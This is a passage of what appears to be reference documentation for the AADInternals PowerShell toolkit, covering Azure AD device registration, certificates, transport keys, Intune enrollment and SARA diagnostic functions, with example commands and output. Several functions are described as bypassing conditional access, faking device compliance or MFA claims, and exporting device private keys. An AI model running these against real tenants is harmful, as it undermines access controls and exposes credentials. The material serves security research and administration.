<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Generate a new device P2P certificate using the device certificate</span>
<span class="nb">New-AADIntP2PDeviceCertificate</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">d03994c9</span><span class="p">-</span><span class="n">24f8</span><span class="p">-</span><span class="n">41ba-a156</span><span class="p">-</span><span class="n">1805998d6dc7</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-TenantId</span> <span class="n">4169fee0-df47</span><span class="p">-</span><span class="n">4e31-b1d7</span><span class="p">-</span><span class="n">5d248222b872</span> <span class="n">-DeviceName</span> <span class="s2">"mypc1.company.com"</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Device certificate successfully created:
  Subject:         "CN=d03994c9-24f8-41ba-a156-1805998d6dc7, DC=4169fee0-df47-4e31-b1d7-5d248222b872"
  DnsName:         "mydevice.contoso.com"
  Issuer:          "CN=MS-Organization-P2P-Access [2020]"
  Cert thumbprint: 84D7641F9BFA90767EA3456E443E21948FC425E5
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7-P2P.pfx"
  CA file name :   "d03994c9-24f8-41ba-a156-1805998d6dc7-P2P-CA.der"
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Generate a new user P2P certificate using the PRT and session key</span>
<span class="nb">New-AADIntP2PDeviceCertificate</span> <span class="n">-Settings</span> <span class="nv">$prtKeys</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>User certificate successfully created:
  Subject:         "CN=TestU@contoso.com, CN=S-1-12-1-xx-xx-xx-xx, DC=0f73eaa6-7fd6-48b8-8897-e382ba96daf4"
  Issuer:          "CN=MS-Organization-P2P-Access [2020]"
  Cert thumbprint: A7F1D1F134569E0234E6AA722354D99C3AA68D0F
  Cert file name : "TestU@contoso.com-P2P.pfx"
  CA file name :   "TestU@contoso.com-P2P-CA.der"
</code></pre>

<h3 id="join-aadintdevicetointunemdm-m">Join-AADIntDeviceToIntuneMDM (M)</h3>

<p>Since version 0.4.1 <br>
Enrolls the given device to Azure AD and generates a corresponding certificate.</p>

<p>After enrollment, the device is in compliant state, which allows bypassing conditional access (CA) restrictions based on the compliance.</p>

<p>The certificate has no password.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token with device id claim</span>
<span class="nb">Get-AADIntAccessTokenForIntuneMDM</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">d03994c9</span><span class="p">-</span><span class="n">24f8</span><span class="p">-</span><span class="n">41ba-a156</span><span class="p">-</span><span class="n">1805998d6dc7</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-SaveToCache</span>

<span class="c"># Enroll the device to Intune</span>
<span class="nb">Join-AADIntDeviceToIntune</span> <span class="n">-DeviceName</span> <span class="s2">"My computer"</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Intune client certificate successfully created:
  Subject:         "CN=5ede6e7a-7b77-41bd-bfe0-ef29ca70a3fb"
  Issuer:          "CN=Microsoft Intune MDM Device CA"
  Cert thumbprint: A1D407FF66EF05D153B67129B8541058A1C395B1
  Cert file name:  "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx"
  CA file name :   "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM-CA.der"
  IntMedCA file :  "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM-INTMED-CA.der"
</code></pre>

<h3 id="start-aadintdevicedmsync">Start-AADIntDeviceDMSync (*)</h3>

<p>Since version 0.4.2 <br>
Starts a device callback to Intune. Resets also the name of the device to given device name.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Start the device </span>
<span class="nb">Start-AADIntDeviceIntuneCallback</span> <span class="n">-pfxFileName</span> <span class="p">.\</span><span class="n">d03994c9</span><span class="p">-</span><span class="n">24f8</span><span class="p">-</span><span class="n">41ba-a156</span><span class="p">-</span><span class="n">1805998d6dc7MDM</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintdeviceregauthmethods-a">Get-AADIntDeviceRegAuthMethods (A)</h3>

<p>Since version 0.4.3 <br>
Get’s the authentication methods used while registering the device.</p>

<p>For instance, if <strong>mfa</strong> was used while registering the device, also the PRT has mfa claim present.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token </span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Get the authentication methods</span>
<span class="nb">Get-AADIntDeviceRegAuthMethods</span> <span class="n">-DeviceId</span> <span class="s2">"d03994c9-24f8-41ba-a156-1805998d6dc7"</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>pwd
</code></pre>

<h3 id="set-aadintdeviceregauthmethods-a">Set-AADIntDeviceRegAuthMethods (A)</h3>

<p>Since version 0.4.3 <br>
Set’s the authentication methods used while registering the device.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token </span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Set the authentication methods</span>
<span class="nb">Set-AADIntDeviceRegAuthMethods</span> <span class="n">-DeviceId</span> <span class="s2">"d03994c9-24f8-41ba-a156-1805998d6dc7"</span> <span class="n">-Methods</span> <span class="n">pwd</span><span class="p">,</span><span class="n">rsa</span><span class="p">,</span><span class="n">mfa</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>pwd
rsa
mfa
</code></pre>

<h3 id="get-aadintdevicetransportkey-a">Get-AADIntDeviceTransportKey (A)</h3>

<p>Since version 0.4.3 <br>
Gets the public key of transport key of the device created during registration/join.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token </span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Export the transport key </span>
<span class="nb">Get-AADIntDeviceTransportKey</span> <span class="n">-DeviceId</span> <span class="s2">"d03994c9-24f8-41ba-a156-1805998d6dc7"</span> 
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Device TKPUB key successfully exported:
  Device ID:             d03994c9-24f8-41ba-a156-1805998d6dc7
  Cert thumbprint:       4b56e1f1b80024359e34010d9aab3ced9c67ff5e
  Cert SHA256:           VD3rdP4R2KMzhp/TdqnoFTg6FaO5R0dE7LoC/H155M=
  Public key file name : "d03994c9-24f8-41ba-a156-1805998d6dc7-TKPUB.json"
</code></pre>

<h3 id="set-aadintdevicetransportkey-a">Set-AADIntDeviceTransportKey (A)</h3>

<p>Since version 0.4.3 <br>
Sets the public key of transport key of the device created during registration/join.</p>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token </span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Change the transport key to the internal any.sts</span>
<span class="nb">Set-AADIntDeviceTransportKey</span> <span class="n">-DeviceId</span> <span class="s2">"d03994c9-24f8-41ba-a156-1805998d6dc7"</span> <span class="n">-UseBuiltInCertificate</span>
</code></pre></div>
<p></p>

<p><strong>Example2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Change the transport key exported earlier</span>
<span class="nb">Set-AADIntDeviceTransportKey</span> <span class="n">-DeviceId</span> <span class="s2">"d03994c9-24f8-41ba-a156-1805998d6dc7"</span> <span class="n">-JsonFileName</span> <span class="p">.\</span><span class="n">d03994c9</span><span class="p">-</span><span class="n">24f8</span><span class="p">-</span><span class="n">41ba-a156</span><span class="p">-</span><span class="n">1805998d6dc7-TKPUB</span><span class="p">.</span><span class="n">json</span>
</code></pre></div>
<p></p>

<p><strong>Example3:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Change the transport key using pfx</span>
<span class="nb">Set-AADIntDeviceTransportKey</span> <span class="n">-DeviceId</span> <span class="s2">"d03994c9-24f8-41ba-a156-1805998d6dc7"</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">my_cert</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-PfxPassword</span> <span class="s2">"MyPassword"</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintdevicecompliance-a">Get-AADIntDeviceCompliance (A)</h3>

<p>Since version 0.4.3 <br>
Gets the user’s device compliance status using AAD Graph API. Does not require admin rights!</p>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token </span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Get the device compliance</span>
<span class="nb">Get-AADIntDeviceCompliance</span> <span class="n">-DeviceId</span> <span class="s2">"d03994c9-24f8-41ba-a156-1805998d6dc7"</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>displayName           : SixByFour
objectId              : 2eaa21a1-6362-4d3f-afc4-597592217ef0
deviceId              : d03994c9-24f8-41ba-a156-1805998d6dc7
isCompliant           : False
isManaged             : True
deviceOwnership       : Company
deviceManagementAppId : 0000000a-0000-0000-c000-000000000000
</code></pre>

<p><strong>Example2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the device compliance of owned devices</span>
<span class="nb">Get-AADIntDeviceCompliance</span> <span class="n">-My</span> <span class="p">|</span> <span class="nb">Format-Table</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>displayName   objectId                             deviceId                             isCompliant isManaged deviceOwnership deviceManagementAppId 
-----------   --------                             --------                             ----------- --------- --------------- ---------------------
SixByFour     2eaa21a1-6362-4d3f-afc4-597592217ef0 d03994c9-24f8-41ba-a156-1805998d6dc7       False      True Company         0000000a-0000-0000-c000-000000000000
DESKTOP-X4LCS 8ba68233-4d2b-4331-8b8b-27bc53204d8b c9dcde64-5d0f-4b3c-b711-cb6947837dc2       False      True Company         0000000a-0000-0000-c000-000000000000
SM-1234       c00af9fe-108e-446b-aeee-bf06262973dc 74080692-fb38-4a7b-be25-27d9cbf95705                       Personal
</code></pre>

<h3 id="set-aadintdevicecompliant-a">Set-AADIntDeviceCompliant (A)</h3>

<p>Since version 0.4.3 <br>
Sets the user’s device compliant using AAD Graph API. Does not require admin rights. <br>
Compliant and managed statuses can be used in conditional access (CA) rules.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token </span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Set the device compliant</span>
<span class="nb">Set-AADIntDeviceCompliant</span> <span class="n">-DeviceId</span> <span class="s2">"d03994c9-24f8-41ba-a156-1805998d6dc7"</span> <span class="n">-Managed</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>displayName           : SixByFour
objectId              : 2eaa21a1-6362-4d3f-afc4-597592217ef0
deviceId              : d03994c9-24f8-41ba-a156-1805998d6dc7
isCompliant           : 
isManaged             : True
deviceOwnership       : Company
deviceManagementAppId : 0000000a-0000-0000-c000-000000000000
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token </span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Set the device compliant</span>
<span class="nb">Set-AADIntDeviceCompliant</span> <span class="n">-DeviceId</span> <span class="s2">"d03994c9-24f8-41ba-a156-1805998d6dc7"</span> <span class="n">-Compliant</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>displayName           : SixByFour
objectId              : 2eaa21a1-6362-4d3f-afc4-597592217ef0
deviceId              : d03994c9-24f8-41ba-a156-1805998d6dc7
isCompliant           : True
isManaged             : True
deviceOwnership       : Company
deviceManagementAppId : 0000000a-0000-0000-c000-000000000000
</code></pre>

<h3 id="export-aadintlocaldevicecertificate">Export-AADIntLocalDeviceCertificate</h3>

<p>Since version 0.6.6 <br>
Exports the device certificate and private key of the local AAD joined/registered device.<br>
Certificate filename: &lt;deviceid&gt;.pfx<br></p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export the device certificate</span>
<span class="nb">Export-AADIntLocalDeviceCertificate</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Certificate exported to   f72ad27e-5833-48d3-b1d6-00b89c429b91.pfx
</code></pre>

<h3 id="export-aadintlocaldevicetransportkey">Export-AADIntLocalDeviceTransportKey</h3>

<p>Since version 0.6.6 <br>
Exports the transport key of the local AAD joined/registered device. <br>
Filename:  &lt;deviceid&gt;_tk.pem</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export the device transport keys</span>
<span class="nb">Export-AADIntLocalDeviceTransportKey</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Transport key exported to f72ad27e-5833-48d3-b1d6-00b89c429b91_tk.pem
</code></pre>

<h3 id="join-aadintlocaldevicetoazuread">Join-AADIntLocalDeviceToAzureAD</h3>

<p>Since version 0.6.6 <br></p>

<p>Joins the local Windows device to Azure AD using the given certificate (and keys) created or exported earlier with AADInternals.</p>

<p>Creates required registry keys and values, saves transport key to SystemKeys, and starts related scheduled tasks.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Save access token to cache </span>
<span class="nb">Get-AADIntAccessTokenForAADJoin</span> <span class="n">-SaveToCache</span>
<span class="c"># "Join" the device to Azure AD</span>
<span class="nb">Join-AADIntDeviceToAzureAD</span> <span class="n">-DeviceName</span> <span class="s2">"My computer"</span> <span class="n">-DeviceType</span> <span class="s2">"Commodore"</span> <span class="n">-OSVersion</span> <span class="s2">"C64"</span>
</code></pre></div>
<p></p>

<pre><code>Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Configure the local device to use the provided device certificate</span>
<span class="nb">Join-AADIntLocalDeviceToAzureAD</span> <span class="n">-UserPrincipalName</span> <span class="s2">"JohnD@company.com"</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">f72ad27e</span><span class="p">-</span><span class="n">5833</span><span class="p">-</span><span class="n">48d3-b1d6</span><span class="p">-</span><span class="n">00b89c429b91</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>Device configured. To confirm success, restart and run: dsregcmd /status
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export the device certificate</span>
<span class="nb">Export-AADIntLocalDeviceCertificate</span>
</code></pre></div>
<p></p>

<pre><code>Certificate exported to   f72ad27e-5833-48d3-b1d6-00b89c429b91.pfx
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export transportkeys</span>
<span class="nb">Export-AADIntLocalDeviceTransportKey</span>
</code></pre></div>


<pre><code>Transport key exported to f72ad27e-5833-48d3-b1d6-00b89c429b91_tk.pem
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Configure the local device to use the provided device certificate and transport key</span>
<span class="nb">Join-AADIntLocalDeviceToAzureAD</span> <span class="n">-UserPrincipalName</span> <span class="s2">"JohnD@company.com"</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">f72ad27e</span><span class="p">-</span><span class="n">5833</span><span class="p">-</span><span class="n">48d3-b1d6</span><span class="p">-</span><span class="n">00b89c429b91</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-TransportKeyFileName</span> <span class="p">.\</span><span class="n">f72ad27e</span><span class="p">-</span><span class="n">5833</span><span class="p">-</span><span class="n">48d3-b1d6</span><span class="p">-</span><span class="n">00b89c429b91_tk</span><span class="p">.</span><span class="n">pem</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>Device configured. To confirm success, restart and run: dsregcmd /status
</code></pre>

<h3 id="add-aadintsyncfabricserviceprincipal-a">Add-AADIntSyncFabricServicePrincipal (A)</h3>

<p>Since version 0.9.3 <br></p>

<p>Adds Microsoft.Azure.SyncFabric service principal needed to create BPRTs.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Save access token to cache </span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>
<span class="c"># Add the Microsoft.Azure.SyncFabric SP</span>
<span class="nb">Add-AADIntSyncFabricServicePrincipal</span>
</code></pre></div>
<p></p>

<pre><code>DisplayName                AppId                                ObjectId                            
-----------                -----                                --------                            
Microsoft.Azure.SyncFabric 00000014-0000-0000-c000-000000000000 138018f7-6aa2-454c-a103-a7e682e17d6b
</code></pre>

<h2 id="client-functions">Client functions</h2>

<h3 id="get-aadintofficeupdatebranch">Get-AADIntOfficeUpdateBranch</h3>

<p>Since version 0.2.4 <br>
This function shows the update branch (currently called channel) of the Office.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get Office update branch</span>
<span class="nb">Get-AADIntOfficeUpdateBranch</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Update branch: Current
</code></pre>

<h3 id="set-aadintofficeupdatebranch">Set-AADIntOfficeUpdateBranch</h3>

<p>Since version 0.2.4 <br>
This function sets the update branch (currently called channel) of the Office.
Must run as administrator.</p>

<table>
<thead>
<tr>
<th>Branch</th>
<th>Channel</th>
<th>Notes</th>
</tr>
</thead>

<tbody>
<tr>
<td>InsiderFast</td>
<td></td>
<td>Weekly builds, not generally supported</td>
</tr>

<tr>
<td>FirstReleaseCurrent</td>
<td></td>
<td>Preview of the current</td>
</tr>

<tr>
<td>Current</td>
<td>Monthly</td>
<td>Monthly updates</td>
</tr>

<tr>
<td>FirstReleaseDeferred</td>
<td>Semi-Annual (Targeted)</td>
<td>Preview of the deferred (March and September)</td>
</tr>

<tr>
<td>Deferred</td>
<td>Semi-Annual</td>
<td>Semi-annual updates (January and July)</td>
</tr>

<tr>
<td>DogFood</td>
<td></td>
<td>Only for Microsoft employees</td>
</tr>
</tbody>
</table>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get Office update branch</span>
<span class="nb">Set-AADIntOfficeUpdateBranch</span> <span class="n">-UpdateBranch</span> <span class="n">InsiderFast</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Update branch: InsiderFast
</code></pre>

<h2 id="support-and-recovery-assistant-sara">Support and Recovery Assistant (SARA)</h2>

<h3 id="test-aadintsaraport">Test-AADIntSARAPort</h3>

<p>Since version 0.9.3 <br>
Tests whether the given TCP port is open on the given host using SARA API.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Test is the given port open</span>
<span class="nb">Get-AADIntAccessTokenForSARA</span> <span class="n">-SaveToCache</span>
<span class="nb">Test-AADIntSARAPort</span> <span class="n">-Host</span> <span class="n">www</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-Port</span> <span class="n">443</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Host            Port Open
----            ---- ----
www.company.com  443 True
</code></pre>

<h3 id="resolve-aadintsarahost">Resolve-AADIntSARAHost</h3>

<p>Since version 0.9.3 <br>
Tests whether the given hostname can be resolved from DNS using SARA API.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Test is the given port open</span>
<span class="nb">Get-AADIntAccessTokenForSARA</span> <span class="n">-SaveToCache</span>
<span class="nb">Resolve-AADIntSARAHost</span> <span class="n">-Host</span> <span class="n">www</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Host            Resolved
----            --------
www.company.com     True
</code></pre>

<h3 id="get-aadintsarauserinfo">Get-AADIntSARAUserInfo</h3>

<p>Since version 0.2.4 <br>
This function gets user information using Microsoft Support and Recovery Assistant (SARA) API.
Can help in diagnostics and problem shooting. The analysis is run at MS diagnostic server and can take up to 30 seconds.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get user information</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForSARA</span>
<span class="nb">Get-AADIntSARAUserInfo</span> <span class="n">-AccessToken</span> <span class="nv">$at</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Retrieving information..
Retrieving information..
Retrieving information..

AnalyzerName          : AnalysisRule, Microsoft.Online.CSE.HRC.Analysis.Analyzers.ExchangeCmdlets.GetUserAnalyzer, Microsoft.Online.CSE.HRC.Analysis.Analyzers.ExchangeCmdlets, Version=16.0.3144.0, Culture=
						neutral, PublicKeyToken=31bf3856ad364e35
AnalyzerDesc          : Attempting to get information about user "user@company.com".
StartTime             : 2019-07-08T12:29:40.4911399Z
Duration              : 00:00:51.1166849
CoreDuration          : 00:00:51.1166849
WaitingDuration       : 00:00:00
TotalChildrenDuration : 00:00:00
TotalWaitingDuration  : 00:00:00
ParentId              : 00000000-0000-0000-0000-000000000000
Value                 : true
ResultTitle           : Extracting information about Office 365 user is completed.
ResultTitleId         : Microsoft.Online.CSE.HRC.Analysis.Analyzers.ExchangeCmdlets.StringsGetUserComplete
UserMessage           : Successfully got the user information for "user@company.com".
UserMessageId         : Microsoft.Online.CSE.HRC.Analysis.Analyzers.ExchangeCmdlets.StringsGetUserSuccessDesc
AdminMessage          : 
SupportMessage        : 
IsMessageShown        : False
GenericInfo           : 
Severity              : 2
OverridesChildren     : False
ProblemId             : 00000000-0000-0000-0000-000000000000
TimeCached            : 0001-01-01T00:00:00
SaraSymptomId         : 00000000-0000-0000-0000-000000000000
SaraWorkflowRunId     : 00000000-0000-0000-0000-000000000000
SaraSymptomRunId      : 00000000-0000-0000-0000-000000000000
SaraSessionId         : 00000000-0000-0000-0000-000000000000
Id                    : d5b4c239-7619-4367-9ccb-e9fe2fe01e23

DisplayName               : Demo USer
FirstName                 : Demo
Guid                      : 67a93665-decb-4058-b42a-271d41c47c61
Id                        : 
Identity                  : EURP185A001.PROD.OUTLOOK.COM/Microsoft Exchange Hosted Organizations/demoo365life4.onmicrosoft.com/AdminO365life
IsDirSynced               : False
IsValid                   : True
LastName                  : User
MicrosoftOnlineServicesID : user@company.com
Name                      : DemoUser
NetID                     : 401320004BA7A415
RecipientType             : UserMailbox
RecipientTypeDetails      : UserMailbox
UserPrincipalName         : user@company.com
WindowsEmailAddress       : user@company.com
WindowsLiveID             : user@company.com
IsHybridTenant            : False
Forest                    : EURP185.PROD.OUTLOOK.COM
</code></pre>

<h3 id="get-aadintsaratenantinfo">Get-AADIntSARATenantInfo</h3>

<p>Since version 0.2.4 <br>
This function gets tenant information using Microsoft Support and Recovery Assistant (SARA) API.
Can help in diagnostics and problem shooting. The analysis is run at MS diagnostic server but should take only a second or two.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get user information</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForSARA</span>
<span class="nb">Get-AADIntSARATenantInfo</span> <span class="n">-AccessToken</span> <span class="nv">$at</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Retrieving information..

AnalyzerName          : AnalysisRule, Microsoft.Online.CSE.HRC.Analysis.Analyzers.TenantInfo.TenantUserInfoAnalyzer, Microsoft.Online.CSE.HRC.Analysis.Analyzers.TenantInfo, Version=16.0.3144.0, Culture=neu
                        tral, PublicKeyToken=31bf3856ad364e35
AnalyzerDesc          : Checking your tenant and account information.
StartTime             : 2019-07-08T12:31:06.1602586Z
Duration              : 00:00:00.6250818
CoreDuration          : 00:00:00.6250818
WaitingDuration       : 00:00:00
TotalChildrenDuration : 00:00:00
TotalWaitingDuration  : 00:00:00
ParentId              : 00000000-0000-0000-0000-000000000000
Value                 : true
ResultTitle           : The licenses of your tenant and account are all good!
ResultTitleId         : Microsoft.Online.CSE.HRC.Analysis.Analyzers.TenantInfo.StringsGetTenantInfoSuccess
UserMessage           : 
UserMessageId         : 
AdminMessage          : 
SupportMessage        : &lt;Setup&gt;&lt;ProductId&gt;O365ProPlusRetail&lt;/ProductId&gt;&lt;ReleaseTrack&gt;False&lt;/ReleaseTrack&gt;&lt;/Setup&gt;
IsMessageShown        : False
GenericInfo           : User Puid is not null or empty.OrgIg_User&lt;TenantUserInfo&gt;&lt;IsLicensed&gt;True&lt;/IsLicensed&gt;&lt;ProvisioningStatus&gt;PendingInput&lt;/ProvisioningStatus&gt;&lt;PreferredLanguage&gt;en&lt;/PreferredLanguage/&gt;
						&lt;ValidationStatus&gt;Healthy&lt;/ValidationStatus&gt;&lt;ReleaseTrack&gt;Other&lt;/ReleaseTrack&gt;&lt;LicenseInformations&gt;&lt;LicenseInformation&gt;&lt;SKUPartNumber&gt;SPE_E5&lt;/SKUPartNumber&gt;&lt;ServiceStatus&gt;&lt;ServiceTy
						pe&gt;Exchange&lt;/ServiceType&gt;&lt;ServiceName&gt;INFORMATION_BARRIERS&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;PendingProvisioning&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Micro
						softKaizala&lt;/ServiceType&gt;&lt;ServiceName&gt;KAIZALA_STANDALONE&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;PendingProvisioning&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Bing&lt;/S
						erviceType&gt;&lt;ServiceName&gt;MICROSOFT_SEARCH&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;PendingProvisioning&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Exchange&lt;/ServiceType&gt;&lt;
						ServiceName&gt;PREMIUM_ENCRYPTION&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;WhiteboardServices&lt;/ServiceType&gt;&lt;ServiceName&gt;
						WHITEBOARD_PLAN3&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Exchange&lt;/ServiceType&gt;&lt;ServiceName&gt;MIP_S_CLP2&lt;/ServiceName&gt;
						&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Exchange&lt;/ServiceType&gt;&lt;ServiceName&gt;MIP_S_CLP1&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/P
						rovisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Exchange&lt;/ServiceType&gt;&lt;ServiceName&gt;MYANALYTICS_P2&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/Servic
						eStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;Exchange&lt;/ServiceType&gt;&lt;ServiceName&gt;PAM_ENTERPRISE&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;Se
						rviceType&gt;AzureAdvancedThreatAnalytics&lt;/ServiceType&gt;&lt;ServiceName&gt;ATA&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Disabled&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;To-Do&lt;
						/ServiceType&gt;&lt;ServiceName&gt;BPOS_S_TODO_3&lt;/ServiceName&gt;&lt;ProvisioningStatus&gt;Success&lt;/ProvisioningStatus&gt;&lt;/ServiceStatus&gt;&lt;ServiceStatus&gt;&lt;ServiceType&gt;ProcessSimple&lt;/ServiceType&gt;&lt;ServiceN
